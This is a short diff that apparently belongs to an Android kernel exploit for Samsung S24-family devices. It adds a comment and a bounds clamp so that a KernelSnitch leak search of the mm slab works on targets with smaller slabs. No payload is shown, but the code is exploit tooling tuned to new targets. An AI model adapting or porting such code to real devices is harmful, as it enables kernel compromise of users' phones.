@@ -1062,6 +1062,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
     search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
   }
+  /* KernelSnitch object indices are relative to the mm slab
+   * (mm_objs_per_slab objects per slab).  The S24-family slide window
+   * (APP_SLIDE_MIN/MAX_OBJECT_INDEX) is an in-page (32K) index space that can
+   * exceed the slab object count on targets with MM_SLAB_ORDER=0 (e1q: 4K mm
+   * slab -> 4 objects/slab, in-page window 0..33).  Clamp so the
+   * kernelsnitch_set_search_bounds assertion holds; the post-leak in-page
+   * object-index check in prepare_kernel_page is a separate check and stays
+   * on the full window. */
+  if (search_min_object_index >= mm_objs_per_slab)
+    search_min_object_index = 0;
+  if (search_max_object_index >= mm_objs_per_slab)
+    search_max_object_index = mm_objs_per_slab - 1;
   kernelsnitch_set_search_bounds(
       ks, KERNELSNITCH_IDENTITY_START,
       APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
